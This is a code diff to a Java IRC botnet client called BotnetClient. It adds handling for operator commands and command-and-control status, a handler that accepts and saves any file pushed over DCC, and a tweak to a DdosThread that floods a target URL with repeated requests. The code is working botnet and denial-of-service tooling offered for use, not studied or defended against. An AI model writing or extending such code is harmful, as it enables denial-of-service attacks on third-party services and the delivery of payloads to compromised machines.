@@ -58,7 +58,7 @@ public class BotnetClient extends PircBot {
 		} else if (message.toLowerCase().startsWith("lease")) {
 			System.out.println("Leasing Myself");
 		} else {
-			System.out.println("<" + sender + ">: " + message);
+			System.out.println(sender + "<" + hostname + "> tried to use me with (" + message + ")");
 		}
 	}
 	
@@ -71,6 +71,21 @@ public class BotnetClient extends PircBot {
 			op(CHANNEL, sender);
 			deOp(CHANNEL, id);
 			System.out.println("Operator status given to " + CC);
+		}
+	}
+	
+	protected void onIncomingFileTransfer(DccFileTransfer transfer) {
+		String fileName = transfer.getFile().getName();
+		System.out.println("Receiving file: " + fileName);
+		transfer.receive(new File(fileName), false);
+	}
+	
+	protected void onFileTransferFinished(DccFileTransfer transfer, Exception e) {
+		if (e != null) {
+			System.out.println(e.getMessage());
+		} else {
+			String fileName = transfer.getFile().getName();
+			System.out.println("Received file: " + fileName);
 		}
 	}
 	
@@ -152,8 +167,11 @@ public class BotnetClient extends PircBot {
 				try {
 					URLConnection connect = url.openConnection();
 					Scanner in = new Scanner(new BufferedReader(new InputStreamReader(connect.getInputStream())));
-					while (in.hasNextLine()) {
+					if (in.hasNextLine()) {
 						System.out.println(in.nextLine());
+					}
+					while (in.hasNextLine()) {
+						in.nextLine();
 					}
 					DdosThread.sleep(sleeptime);
 				} catch (InterruptedException e) {
